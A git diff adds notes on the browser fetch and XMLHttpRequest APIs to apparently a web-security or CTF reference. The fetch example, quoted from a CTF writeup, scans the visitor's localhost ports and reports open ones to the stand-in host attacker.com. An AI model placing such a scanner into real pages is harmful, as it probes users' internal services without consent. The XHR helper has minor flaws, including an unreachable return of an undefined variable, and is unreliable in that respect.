@@ -106,7 +106,57 @@ TODO: native browser APIs
 
 ### JavaScript Utilities
 
-TODO
+This section covers some basic utilities provided in the major browsers' native runtimes.
+
+#### `fetch`
+
+The [`fetch`](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch) API is the modern solution for making client-side requests from the browser. GitHub has some nice basic documentation on this API [here](https://github.github.io/fetch/).
+
+A nice snippet from [@lbherrera_](https://twitter.com/lbherrera_)'s [h1415 writeup](https://lbherrera.github.io/lab/h1415-ctf-writeup.html) show's how to use `fetch` for port scanning:
+
+```js
+const checkPort = (port) => {
+    fetch(`http://localhost:${port}`, {mode: 'no-cors'}).then(() => {
+        let img = document.createElement('img');
+        img.src = `http://attacker.com/ping?port=${port}`;
+    });
+}
+
+for(let i=0; i<1000; i++) {
+    checkPort(i);
+}
+```
+
+#### `XMLHttpRequest`
+
+The [`XMLHttpRequest`](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/Using_XMLHttpRequest) is the legacy API for creating requests from client-side JavaScript in the browser.
+
+Here's a short example of sending a `GET` request and reading the response:
+
+```js
+function get_resp_body(xhr) {
+  if (!xhr.responseType || xhr.responseType === "text") {
+    return xhr.responseText;
+  } else if (xhr.responseType === "document") {
+    return xhr.responseXML;
+  } else if (xhr.responseType === "json") {
+    return xhr.responseJSON;
+  } else {
+    return xhr.response;
+  }
+  return data;
+}
+
+var xhr = new XMLHttpRequest();
+xhr.onreadystatechange = function() {
+  if (xhr.readyState == XMLHttpRequest.DONE) {
+    console.log(get_resp_body(xhr));
+  }
+}
+xhr.open('GET', 'http://www.google.com', true);
+xhr.send(null);
+```
+
 
 TODO: fetch and XHR
 
